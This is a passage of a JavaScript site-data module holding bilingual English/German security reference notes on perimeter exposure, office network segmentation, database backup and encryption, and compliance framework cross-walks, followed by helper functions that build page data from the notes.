  </li>
  <li><strong>Role-engine quirks per vendor.</strong>
    <ul>
      <li>Postgres: <code>GRANT</code> with options, default privileges, role inheritance, ownership chains — audit requires SQL not point-and-click.</li>
      <li>MySQL: per-database / per-table / per-column grants. <code>SUPER</code> = root-equivalent.</li>
      <li>Oracle / SQL Server: complex role hierarchies, schema ownership, application roles. Audit tooling vendor-specific.</li>
    </ul>
  </li>
  <li><strong>Encryption-at-rest trade-offs.</strong>
    <ul>
      <li>TDE (Transparent Data Encryption) — disk-level, defends against backup/disk theft, not against in-DB compromise.</li>
      <li>Per-tenant column encryption — defends against in-DB read for other tenants; query patterns limited.</li>
      <li>Customer-managed KMS keys — customer can revoke; operational complexity.</li>
      <li>Key rotation — operationally expensive at scale; envelope encryption (DEK + KEK) decouples.</li>
    </ul>
  </li>
  <li><strong>Audit logging.</strong> Per-query audit at scale = expensive; per-privileged-action audit affordable. Capture DDL, GRANT/REVOKE, login from outside maintenance window, failed-auth bursts.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For perimeter, every six months delete or restrict 10% of your exposed surface. For office, segmentation is the only durable control; everything else patches a leaky boundary. For database, the backup that defends you from ransomware is the one you tested last quarter — the rest is hope.</div>
`,
      `
<h2>Perimeter (External-Facing-Web)</h2>
<ul>
  <li><strong>Auffindbarkeit.</strong> Deine Domain wird von Censys, Shodan, FOFA und jedem Recon-Tool enumeriert. Annehmen: 100% deiner externen Surface ist bekannt. Kontinuierlich inventorisieren — was du nicht kennst, verteidigst du nicht.</li>
  <li><strong>Exposure-Budget.</strong> Jeder Public-Endpoint = Angriffsfläche. Katalogisieren: Hostname + Port + Service + Owner. Verwaiste Surface aggressiv abbauen. "Temporäre" Subdomains leben ewig.</li>
  <li><strong>Subdomain-Takeover.</strong> DNS-Record zeigt auf decommissionierte Cloud-Ressource (S3-Bucket, Azure-Web-App, Heroku-App). Angreifer claimed Ressource = kontrolliert Subdomain. Quartalsweise DNS-Audit; automatisierte <code>subjack</code>/<code>nuclei</code>-Templates.</li>
  <li><strong>Credential-Stuffing-Baseline.</strong> 99% des Login-Traffics auf populärem Endpoint ist malicious Automation. Counter:
    <ul>
      <li>HaveIBeenPwned-Integration — bekannt-geleakte Passwörter bei Signup/Change ablehnen.</li>
      <li>Passkeys / WebAuthn als Primary; Passwort als Fallback.</li>
      <li>Per-IP/JA4/User-Agent-Rate-Limit auf Login; progressive Captcha; Account-Lockout mit sinnvoller Recovery.</li>
      <li>MFA verpflichtend für jede nicht-triviale Action.</li>
    </ul>
  </li>
  <li><strong>Scraping-Kooperative.</strong> Verteilte Residential-Proxy-Botnets scrapen protected Content. Heuristik: Behavioral-Biometrics (Maus-/Scroll-Patterns), Browser-Feature-Inkonsistenz, Request-Velocity pro Identity.</li>
  <li><strong>Abuse-Traffic-Muster.</strong> Cross-Protocol-Noise — gleiche IP-Block versucht SSH, FTP, RDP, HTTP-Login — auto-Block auf Network-Layer. Reputation-Feeds (AbuseIPDB, Spamhaus, GreyNoise) reduzieren Noise.</li>
</ul>

<h2>Office-Netzwerk</h2>
<ul>
  <li><strong>BYOD-Admission.</strong>
    <ul>
      <li>802.1X mit Certificate-based-Auth auf Wired und Wireless.</li>
      <li>NAC-Posture-Check (OS-Version, EDR läuft, Disk-Encryption an) vor IP-Vergabe.</li>
      <li>Failed Posture → Quarantine-VLAN mit Remediation-Portal.</li>
    </ul>
  </li>
  <li><strong>Segmentierung.</strong>
    <ul>
      <li>Corp-VLAN — nur Managed-Devices.</li>
      <li>BYOD-VLAN — Personal-Devices; können Corp-Ressourcen nicht außer via VPN/ZTNA erreichen.</li>
      <li>Guest-VLAN — Internet only, isoliert von allem Corporate.</li>
      <li>IoT/Printer-VLAN — restricted Egress (Print-Server, NTP, Vendor-Cloud only).</li>
    </ul>
  </li>
  <li><strong>Drucker-Realität.</strong> Drucker haben OS, Web-Admin, Default-Creds, offene Telnet/FTP und CVE-History. Wie Untrusted behandeln: dediziertes VLAN, kein Inbound von Corp, Firmware auf Schedule, Default-Creds geändert.</li>
  <li><strong>IoT-Rauschniveau.</strong> Conference-Room-Displays, Smart-TVs, Sensoren. Default-Verhalten: Vendor-Cloud anrufen, mDNS broadcasten. Mitigation: Per-Device-Class-Allow-List-Egress; Broadcast/Multicast-Bridging zwischen VLANs blocken.</li>
  <li><strong>Guest-Segmentierung, die hält.</strong> Separates SSID + separates VLAN + separater Egress + Client-Isolation (kein Peer-to-Peer auf Guest). Social-Engineering-Brücke (Mitarbeiter steckt Guest-Device in Corp-VLAN-Port) durch 802.1X gefangen.</li>
  <li><strong>Nützlicher Audit-Trail.</strong> DHCP-Leases (IP → MAC → Switch-Port-Mapping), DNS-Query-Logs (fängt Malware-C2 und Shadow-IT), 802.1X-Auth-Events. Compliance-Theater-Audit-Trail = unkorrelierte Raw-Syslog ohne Analysefläche.</li>
</ul>

<h2>Datenbank-Sicherheit jenseits Injection</h2>
<ul>
  <li><strong>Replikationstopologie.</strong>
    <ul>
      <li>Primary-Replica-Async — Replica-Lag bedeutet RPO = Lag beim Incident. Kein Zero-Data-Loss versprechen.</li>
      <li>Synchron Multi-Region — langsamere Writes, Zero-Data-Loss bei Single-Region-Failure.</li>
      <li>Logical-Replication — selektive Tables, Cross-Version. Nützlich für Migration und Audit-Feed.</li>
    </ul>
  </li>
  <li><strong>Backup-Haltung (3-2-1 + Ransomware-resilient).</strong>
    <ul>
      <li>3 Kopien, 2 Media-Typen, 1 Off-Site. Modernes Addendum: 1 immutable/air-gapped.</li>
      <li>Off-Host: separate Maschine.</li>
      <li>Off-Network: nicht aus Produktions-Netz erreichbar.</li>
      <li>Off-Account (Cloud): separater AWS-/GCP-/Azure-Account mit One-Way-Replikation und Object-Lock-Immutability.</li>
      <li>Getesteter Restore: quartalsweise Tabletop, jährliche Full-Restore-Übung. Ungetestete Backups sind Wunschdenken.</li>
    </ul>
  </li>
  <li><strong>Rollen-Engine-Quirks pro Vendor.</strong>
    <ul>
      <li>Postgres: <code>GRANT</code> mit Options, Default-Privileges, Role-Inheritance, Ownership-Chains — Audit erfordert SQL, kein Point-and-Click.</li>
      <li>MySQL: per-Database / per-Table / per-Column-Grants. <code>SUPER</code> = Root-equivalent.</li>
      <li>Oracle / SQL Server: komplexe Role-Hierarchien, Schema-Ownership, Application-Roles. Audit-Tooling Vendor-spezifisch.</li>
    </ul>
  </li>
  <li><strong>Encryption-at-Rest-Trade-offs.</strong>
    <ul>
      <li>TDE (Transparent-Data-Encryption) — Disk-Level, schützt gegen Backup-/Disk-Diebstahl, nicht gegen In-DB-Kompromittierung.</li>
      <li>Per-Tenant-Column-Encryption — schützt gegen In-DB-Read für andere Tenants; Query-Patterns limitiert.</li>
      <li>Customer-Managed-KMS-Keys — Customer kann revoken; operative Komplexität.</li>
      <li>Key-Rotation — operativ teuer im Scale; Envelope-Encryption (DEK + KEK) entkoppelt.</li>
    </ul>
  </li>
  <li><strong>Audit-Logging.</strong> Per-Query-Audit im Scale = teuer; Per-Privileged-Action-Audit erschwinglich. DDL, GRANT/REVOKE, Login außerhalb Maintenance-Window, Failed-Auth-Bursts capturen.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für Perimeter alle sechs Monate 10% deiner exponierten Surface löschen oder restricten. Für Office ist Segmentierung die einzige durable Control; alles andere patcht eine leaky Boundary. Für Datenbank ist das Backup, das dich vor Ransomware schützt, das du letztes Quartal getestet hast — der Rest ist Hoffnung.</div>
`
    ),
    phases: ["report", "cves"]
  },
  {
    id: "compliance-and-governance",
    domain: "defensive-ops", tier: 3,
    title: T("Compliance, Risk & Information Security Landscape", "Compliance, Risiko & Informationssicherheits-Landschaft"),
    blurb: T(
      "Cross-walk between common control frameworks, the reference architecture for an in-house risk-control platform, and the field-level orientation map of the discipline.",
      "Cross-Walk zwischen gängigen Control-Frameworks, die Referenzarchitektur einer eigenen Risk-Control-Plattform und die Feldebenen-Orientierungskarte der Disziplin."
    ),
    body: B(
      `
<h2>Framework cross-walk</h2>
<ul>
  <li><strong>ISO 27001 (ISMS).</strong> Process-oriented. Annex A (2022 revision) has 93 controls in 4 themes (Organizational, People, Physical, Technological). Certifiable. Strong in Europe.</li>
  <li><strong>SOC 2 Type II.</strong> AICPA-driven. Trust Services Criteria: Security (CC), Availability, Confidentiality, Processing Integrity, Privacy. Attestation report, not a certification. Required by US enterprise customers.</li>
  <li><strong>NIST CSF 2.0 (2024).</strong> Six functions: Govern, Identify, Protect, Detect, Respond, Recover. Voluntary framework; widely adopted as common language.</li>
  <li><strong>NIST SP 800-53 rev 5.</strong> Detailed control catalog underlying CSF; required for US federal systems.</li>
  <li><strong>BSI IT-Grundschutz.</strong> German federal standard. "Bausteine" map to compliance modules. Maps to ISO 27001 with cross-reference.</li>
  <li><strong>PCI DSS 4.0.</strong> Cardholder data overlay. Twelve requirements; tight on segmentation, encryption, logging. Mandatory for processors / merchants depending on transaction volume.</li>
  <li><strong>HIPAA / HITECH.</strong> US healthcare. Administrative + Physical + Technical Safeguards. Sector overlay, not a complete program.</li>
  <li><strong>DORA (Digital Operational Resilience Act, EU, in force 2025).</strong> Financial sector. ICT risk management, incident reporting, resilience testing, third-party risk.</li>
  <li><strong>NIS2 (EU).</strong> Sectoral cyber-resilience baseline; member-state transposition varies.</li>
  <li><strong>GDPR.</strong> Privacy, not security — but Article 32 mandates appropriate technical/organizational measures, and breach notification under Article 33-34 drives security investment.</li>
</ul>

<h2>Where frameworks speak past each other</h2>
<ul>
  <li><strong>"Risk assessment."</strong> ISO = formal asset-threat-vuln methodology with risk register. SOC 2 = identification of risks relevant to objectives. NIST CSF = ongoing function. Implementations diverge; the same artifact rarely satisfies all three without adaptation.</li>
  <li><strong>"Access review."</strong> SOX = quarterly with sign-off. ISO = periodic. SOC 2 = "regular" with auditor judgment. Operational team builds one process satisfying the strictest.</li>
  <li><strong>"Vulnerability management."</strong> PCI = quarterly external scan + annual pentest with strict timelines. ISO = process exists. NIST = continuous. Frequency and rigor differ.</li>
  <li><strong>"Incident response."</strong> Notification timelines: GDPR 72h, NIS2 24h initial / 72h detailed, PCI immediately, SEC 4 days for material, DORA 4h. Map your notification matrix once.</li>
  <li><strong>"Encryption in transit."</strong> All frameworks require it. None specify which TLS version. Internal standard = TLS 1.2+ minimum, TLS 1.3 preferred; document and reference.</li>
</ul>

<h2>Risk-control platform architecture</h2>
<ul>
  <li><strong>Layer 1 — Signal ingest.</strong>
    <ul>
      <li>Sources: SIEM alerts, EDR detections, vulnerability scanners, cloud-config drift, IAM events, ticketing system.</li>
      <li>Normalize to canonical risk-event schema (asset, control, observation, severity, source, timestamp).</li>
      <li>Deduplicate at ingest.</li>
    </ul>
  </li>
  <li><strong>Layer 2 — Rule layer.</strong>
    <ul>
      <li>Map raw signals → risks. "Three failed-auth events from same user within 5 min" → "credential-stuffing-suspected" risk.</li>
      <li>Map risks → controls (via framework mapping). One risk may impact multiple controls across frameworks.</li>
      <li>Severity scoring: likelihood × impact, calibrated against historic incidents.</li>
    </ul>
  </li>
  <li><strong>Layer 3 — Decision loop.</strong>
    <ul>
      <li>Triage queue per business unit / owner.</li>
      <li>SLA per severity (P1: 24h, P2: 7 days, P3: 30 days).</li>
      <li>Decisions: mitigate / accept / transfer / avoid, with documented rationale.</li>
      <li>Escalation when SLA-breached.</li>
    </ul>
  </li>
  <li><strong>Layer 4 — Audit trail.</strong>
    <ul>
      <li>Append-only event log: who saw what, who decided what, what changed.</li>
      <li>Evidence linkage: every closed risk has artifact (ticket, config snapshot, test result).</li>
      <li>Auditor read-only access scoped to evidence period.</li>
    </ul>
  </li>
  <li><strong>Integrations per layer.</strong>
    <ul>
      <li>Identity (Okta, Azure AD, Google Workspace) — who owns this asset, who can approve.</li>
      <li>Asset/CMDB (ServiceNow, custom) — what is the asset, criticality, owner team.</li>
      <li>Ticketing (Jira, ServiceNow) — risk → ticket auto-create, status sync, closure evidence.</li>
      <li>Cloud-config (AWS Config, Azure Policy, GCP SCC, Wiz / Prisma) — drift signal source.</li>
    </ul>
  </li>
</ul>

<h2>Information-security field map</h2>
<ul>
  <li><strong>Product security.</strong> SDLC, code review, threat modeling, SAST/DAST/SCA, security champions.</li>
  <li><strong>Infrastructure security.</strong> Network, endpoint, cloud config, hardening, patching.</li>
  <li><strong>Identity &amp; access.</strong> SSO, MFA, lifecycle, privileged access, secrets management.</li>
  <li><strong>Governance, risk, compliance.</strong> Frameworks, audits, policy, third-party risk, vendor due diligence.</li>
  <li><strong>Detection &amp; response.</strong> SIEM, EDR, SOAR, SOC operations, incident response, forensics.</li>
  <li><strong>Threat intelligence.</strong> IOC ingest, actor tracking, attribution, intel-driven hunting.</li>
  <li><strong>Offensive security.</strong> Pentest, red team, bug bounty, exploit research.</li>
  <li><strong>Security engineering.</strong> Platform tooling, automation, IaC for security, internal SDK.</li>
  <li><strong>Awareness &amp; training.</strong> Phishing exercises, role-based training, executive briefings.</li>
  <li><strong>Leadership (CISO function).</strong> Strategy, board reporting, budget, headcount, vendor selection, risk acceptance.</li>
</ul>

<h2>Practical CISO orientation</h2>
<ol>
  <li>Pick one primary framework for governance (ISO 27001 if European, NIST CSF if hybrid).</li>
  <li>Add overlays only as required (PCI if you process cards, HIPAA if healthcare, DORA/NIS2 if applicable).</li>
  <li>Map controls once, source evidence once, satisfy all framework reports from the same evidence base.</li>
  <li>Outcome-based metrics over activity-based: "mean time to patch critical CVE" beats "% of policies reviewed".</li>
  <li>Board-level reporting: risk register top 10 with owner, status, trend — not raw vulnerability counts.</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>Frameworks are shared vocabulary, not security. Compliance status tells an auditor you have a process; whether the process produces fewer incidents is an independent question. Optimize for outcomes; let compliance fall out of doing the real work.</div>
`,
      `
<h2>Framework-Cross-Walk</h2>
<ul>
  <li><strong>ISO 27001 (ISMS).</strong> Prozess-orientiert. Annex A (2022-Revision) hat 93 Controls in 4 Themen (Organizational, People, Physical, Technological). Zertifizierbar. Stark in Europa.</li>
  <li><strong>SOC 2 Type II.</strong> AICPA-getrieben. Trust-Services-Criteria: Security (CC), Availability, Confidentiality, Processing-Integrity, Privacy. Attestation-Report, keine Zertifizierung. Von US-Enterprise-Kunden gefordert.</li>
  <li><strong>NIST CSF 2.0 (2024).</strong> Sechs Funktionen: Govern, Identify, Protect, Detect, Respond, Recover. Freiwilliges Framework; weit adoptiert als gemeinsame Sprache.</li>
  <li><strong>NIST SP 800-53 rev 5.</strong> Detaillierter Control-Katalog unter CSF; für US-Federal-Systems verpflichtend.</li>
  <li><strong>BSI IT-Grundschutz.</strong> Deutscher Bundesstandard. "Bausteine" mappen auf Compliance-Module. Mit Cross-Reference auf ISO 27001.</li>
  <li><strong>PCI DSS 4.0.</strong> Cardholder-Data-Overlay. Zwölf Requirements; eng bei Segmentierung, Encryption, Logging. Verpflichtend für Processors / Merchants je nach Transaktions-Volumen.</li>
  <li><strong>HIPAA / HITECH.</strong> US-Healthcare. Administrative + Physical + Technical Safeguards. Sektor-Overlay, kein vollständiges Programm.</li>
  <li><strong>DORA (Digital Operational Resilience Act, EU, in Kraft 2025).</strong> Finanzsektor. ICT-Risk-Management, Incident-Reporting, Resilience-Testing, Third-Party-Risk.</li>
  <li><strong>NIS2 (EU).</strong> Sektoraler Cyber-Resilience-Baseline; Member-State-Transposition variiert.</li>
  <li><strong>DSGVO/GDPR.</strong> Privacy, nicht Security — aber Artikel 32 verlangt angemessene technische/organisatorische Maßnahmen, und Breach-Notification unter Artikel 33-34 treibt Security-Investment.</li>
</ul>

<h2>Wo Frameworks aneinander vorbeireden</h2>
<ul>
  <li><strong>"Risk-Assessment."</strong> ISO = formale Asset-Threat-Vuln-Methodologie mit Risk-Register. SOC 2 = Identifikation relevanter Risks. NIST CSF = laufende Funktion. Implementierungen divergieren; gleiches Artefakt erfüllt selten alle drei ohne Anpassung.</li>
  <li><strong>"Access-Review."</strong> SOX = quartalsweise mit Sign-Off. ISO = periodisch. SOC 2 = "regelmäßig" nach Auditor-Judgment. Operations-Team baut einen Prozess, der den strengsten erfüllt.</li>
  <li><strong>"Vulnerability-Management."</strong> PCI = quartalsweise External-Scan + jährlicher Pentest mit strikten Timelines. ISO = Prozess existiert. NIST = kontinuierlich. Frequenz und Strenge unterscheiden sich.</li>
  <li><strong>"Incident-Response."</strong> Notification-Timelines: DSGVO 72h, NIS2 24h initial / 72h detailliert, PCI sofort, SEC 4 Tage bei Material, DORA 4h. Notification-Matrix einmal mappen.</li>
  <li><strong>"Encryption in Transit."</strong> Alle Frameworks verlangen es. Keines spezifiziert TLS-Version. Interner Standard = TLS 1.2+ Minimum, TLS 1.3 bevorzugt; dokumentieren und referenzieren.</li>
</ul>

<h2>Risk-Control-Plattform-Architektur</h2>
<ul>
  <li><strong>Layer 1 — Signal-Ingest.</strong>
    <ul>
      <li>Sources: SIEM-Alerts, EDR-Detections, Vulnerability-Scanner, Cloud-Config-Drift, IAM-Events, Ticketing-System.</li>
      <li>In Canonical-Risk-Event-Schema normalisieren (Asset, Control, Observation, Severity, Source, Timestamp).</li>
      <li>Beim Ingest deduplizieren.</li>
    </ul>
  </li>
  <li><strong>Layer 2 — Rule-Layer.</strong>
    <ul>
      <li>Raw-Signals → Risks mappen. "Drei Failed-Auth-Events von gleichem User innerhalb 5 Min" → "Credential-Stuffing-Suspected"-Risk.</li>
      <li>Risks → Controls (via Framework-Mapping) mappen. Ein Risk kann mehrere Controls über Frameworks impacten.</li>
      <li>Severity-Scoring: Likelihood × Impact, gegen historische Incidents kalibriert.</li>
    </ul>
  </li>
  <li><strong>Layer 3 — Decision-Loop.</strong>
    <ul>
      <li>Triage-Queue pro Business-Unit / Owner.</li>
      <li>SLA pro Severity (P1: 24h, P2: 7 Tage, P3: 30 Tage).</li>
      <li>Decisions: Mitigate / Accept / Transfer / Avoid, mit dokumentierter Rationale.</li>
      <li>Eskalation bei SLA-Breach.</li>
    </ul>
  </li>
  <li><strong>Layer 4 — Audit-Trail.</strong>
    <ul>
      <li>Append-Only-Event-Log: wer sah was, wer entschied was, was änderte sich.</li>
      <li>Evidence-Linkage: jedes geschlossene Risk hat Artefakt (Ticket, Config-Snapshot, Test-Result).</li>
      <li>Auditor-Read-Only-Access auf Evidence-Period gescoped.</li>
    </ul>
  </li>
  <li><strong>Integrationen pro Layer.</strong>
    <ul>
      <li>Identity (Okta, Azure AD, Google Workspace) — wer besitzt das Asset, wer kann approven.</li>
      <li>Asset/CMDB (ServiceNow, Custom) — was ist das Asset, Kritikalität, Owner-Team.</li>
      <li>Ticketing (Jira, ServiceNow) — Risk → Ticket-Auto-Create, Status-Sync, Closure-Evidence.</li>
      <li>Cloud-Config (AWS Config, Azure Policy, GCP SCC, Wiz / Prisma) — Drift-Signal-Source.</li>
    </ul>
  </li>
</ul>

<h2>Informationssicherheits-Feldkarte</h2>
<ul>
  <li><strong>Product-Security.</strong> SDLC, Code-Review, Threat-Modeling, SAST/DAST/SCA, Security-Champions.</li>
  <li><strong>Infrastructure-Security.</strong> Network, Endpoint, Cloud-Config, Hardening, Patching.</li>
  <li><strong>Identity &amp; Access.</strong> SSO, MFA, Lifecycle, Privileged-Access, Secrets-Management.</li>
  <li><strong>Governance, Risk, Compliance.</strong> Frameworks, Audits, Policy, Third-Party-Risk, Vendor-Due-Diligence.</li>
  <li><strong>Detection &amp; Response.</strong> SIEM, EDR, SOAR, SOC-Operations, Incident-Response, Forensik.</li>
  <li><strong>Threat-Intelligence.</strong> IOC-Ingest, Actor-Tracking, Attribution, Intel-getriebenes Hunting.</li>
  <li><strong>Offensive-Security.</strong> Pentest, Red-Team, Bug-Bounty, Exploit-Research.</li>
  <li><strong>Security-Engineering.</strong> Platform-Tooling, Automation, IaC für Security, internes SDK.</li>
  <li><strong>Awareness &amp; Training.</strong> Phishing-Exercises, Role-Based-Training, Executive-Briefings.</li>
  <li><strong>Leadership (CISO-Funktion).</strong> Strategy, Board-Reporting, Budget, Headcount, Vendor-Selection, Risk-Acceptance.</li>
</ul>

<h2>Praktische CISO-Orientierung</h2>
<ol>
  <li>Ein Primary-Framework für Governance wählen (ISO 27001 wenn europäisch, NIST CSF wenn hybrid).</li>
  <li>Overlays nur nach Bedarf hinzufügen (PCI bei Karten, HIPAA bei Healthcare, DORA/NIS2 wenn applikabel).</li>
  <li>Controls einmal mappen, Evidence einmal sourcen, alle Framework-Reports aus gleicher Evidence-Base befriedigen.</li>
  <li>Outcome-basierte Metrics statt Activity-basiert: "Mean-Time-to-Patch-Critical-CVE" schlägt "% reviewter Policies".</li>
  <li>Board-Level-Reporting: Risk-Register-Top-10 mit Owner, Status, Trend — keine Raw-Vulnerability-Counts.</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>Frameworks sind gemeinsame Vokabulare, keine Security. Compliance-Status sagt einem Auditor, du hast einen Prozess; ob der Prozess weniger Incidents produziert, ist eine unabhängige Frage. Auf Outcomes optimieren; Compliance fällt aus dem Tun der echten Arbeit heraus.</div>
`
    ),
    phases: []
  }
];

// ── Derive page-ready shapes ────────────────────────────────────────

function statsFor(notes) {
  const tierOne = notes.filter((n) => n.tier === 1).length;
  const tierTwo = notes.filter((n) => n.tier === 2).length;
  const tierThree = notes.filter((n) => n.tier === 3).length;
  const phaseSet = new Set();
  for (const n of notes) for (const p of n.phases) phaseSet.add(p);
  return {
    total: notes.length,
    tierOne, tierTwo, tierThree,
    domainCount: DOMAINS.length,
    phaseCount: phaseSet.size
  };
}

function domainsWithNotes(notes) {
  return DOMAINS.map((d) => {
    const list = notes.filter((n) => n.domain === d.id);
    return {
      ...d,
      count: list.length,
      featured: list.filter((n) => n.tier === 1),
      reference: list.filter((n) => n.tier === 2),
      background: list.filter((n) => n.tier === 3)
    };
  });
}

/**
 * Flatten the notes with denormalized domain and sibling info so each
 * note can be paginated into its own page without further lookups.
 *
 *   denormNote = note + {
 *     domainTitle, domainNumber, domainBlurb, domainId,
 *     prev, next  // sibling within the same domain by source order
 *   }
 */
function allNotesDenormalized(notes) {
  const byDomain = new Map();
  for (const d of DOMAINS) byDomain.set(d.id, []);
  for (const n of notes) byDomain.get(n.domain).push(n);

  const out = [];
  for (const d of DOMAINS) {
    const list = byDomain.get(d.id);
    list.forEach((n, idx) => {
      const prev = idx > 0 ? list[idx - 1] : null;
      const next = idx < list.length - 1 ? list[idx + 1] : null;
      out.push({
        ...n,
        domainTitle: d.title,
        domainNumber: d.number,
        domainBlurb: d.blurb,
        siblings: list.filter((x) => x.id !== n.id).map((x) => ({
          id: x.id, title: x.title, tier: x.tier
        })),
        prev: prev ? { id: prev.id, title: prev.title } : null,
        next: next ? { id: next.id, title: next.title } : null
      });
    });
  }
  return out;
}

function noteByIdMap(notes) {
  const map = {};
  for (const n of notes) map[n.id] = n;
  return map;
}

module.exports = {
  domains: domainsWithNotes(NOTES),
  phases: PHASES,
  stats: statsFor(NOTES),
  allNotes: allNotesDenormalized(NOTES),
  noteById: noteByIdMap(NOTES)
};
